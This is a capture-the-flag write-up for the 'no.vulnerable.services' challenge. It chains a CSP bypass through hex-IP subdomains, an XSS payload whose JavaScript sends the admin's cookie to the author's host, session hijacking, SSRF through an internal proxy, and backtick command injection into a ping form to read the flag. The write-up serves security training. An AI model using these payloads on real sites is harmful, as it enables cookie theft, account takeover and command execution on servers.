> Especially thanks to [rebirth](https://github.com/rebirthwyw) who help me a lot when finishing this write-up.

Access site ``http://no.vulnerable.services/``, we can found two useful things here, first, it's CSP:

```
Content-Security-Policy: default-src 'none'; script-src *.no.vulnerable.services https://www.google.com/ https://www.gstatic.com/; style-src *.no.vulnerable.services https://fonts.googleapis.com/ 'unsafe-inline'; img-src *.no.vulnerable.services; font-src *.no.vulnerable.services https://fonts.gstatic.com/; frame-src https://www.google.com/
```

And something like a hint in the footer:

```
Served By: d8a50228.ip.no.vulnerable.services
```

After try sometimes, we found that ``d8a50228`` is the hex format of ``216.165.2.40`` and ``hex(ip).ip.no.vulnerable.services`` would return correspond ip. So we can use this feature to bypass the CSP.

Put the following js script on our site.

```javascript
var img = document.createElement("img");
img.src = "http://7bce41c0.ip.no.vulnerable.services/?cookie=" + encodeURI(document.cookie);
document.body.appendChild(img);
```

And submit the following content:

```html
<script type="text/javascript" src="//{hexip}.ip.no.vulnerable.services/main.js"></script>
```

Then we can see the following record on our server.

```
GET /?cookie=PHPSESSID=ri4r4q1ujkd0rh2fefvcvnfkt0
http://admin.no.vulnerable.services/review.php?id=237
```

Use this cookie visit ``http://admin.no.vulnerable.services``, we will see ``admin.no.vulnerable.services/lb.php`` and ``support.no.vulnerable.services`` on this website.

In ``lb.php``, we can found ``216.165.2.41``, but can not access.

If we change host to ``support.no.vulnerable.services``, it would return ``Hacking detected! Denied attempt to proxy to a NVS internal hostname. Your IP has been logged.``.

Seems ``216.165.2.41`` is a proxy, so we could use ``{hexip}.ip.no.vulnerable.service`` again.

Dig ``support.no.vulnerable.services``, know its ip is ``172.16.2.5``, so we can use ``ac100205.ip.no.vulnerable.services`` to access it.

Then we get a page can ping, seems it's a command line injection. After try

```
127.0.0.`ls`
```

get

```
ping: 127.0.0.flag.txt index.php ping.php: Name or service not known 
```

Finally, it's time to get flag:

```
127.0.0.``cat flag.txt``
```

=> 

```
ping: 127.0.0.flag{7672f158167cab32aebc161abe0fbfcaee2868c1}: Name or service not known 
```
